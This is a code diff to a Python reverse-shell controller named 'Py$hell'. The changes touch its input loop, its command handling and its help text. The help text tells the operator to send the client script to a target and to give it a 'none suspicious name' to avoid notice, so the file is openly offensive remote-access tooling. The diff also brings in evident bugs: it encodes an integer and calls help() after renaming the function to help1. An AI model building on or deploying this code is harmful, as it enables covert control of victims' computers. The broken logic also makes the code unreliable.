@@ -47,7 +47,7 @@ def main():
         while True:
             try:
                 user_input = int(input("Press 1 or Else To Exit:"))
-                conn.send(user_input.encode(FORMAT))
+                conn.send(user_input.encode('utf-8'))
                 output = conn.recv(BUF_SIZE).decode(FORMAT)
             except ValueError as e:
                 print(f"{Red}[!] The Problem Is: {e} {Reset}")
@@ -96,8 +96,8 @@ def reverse_shell(conn):
                             break
                         file_to_write.write(bytes(data))
                     file_to_write.close()
-            elif "help5" in command.lower():
-                help5()
+            elif "help" in command.lower():
+                help()
                 continue
             elif "ps" in command.lower():
                 stdout = conn.recv(BUF_SIZE).decode(FORMAT)
@@ -122,9 +122,9 @@ def reverse_shell(conn):
         s.close()
 
 
-def help5():
+def help1():
     print("""HELP ME PLEASE:
-\tThis is Py$h\nell, a python based reverse shell.
+\tThis is Py$hell, a python based reverse shell.
 \tYou need to send to the target the client side of the script.
 \tIt will be in the directory by the name reverse-shell_client.py .
 \tIt is recommended to change the client side name for a none suspicious name.
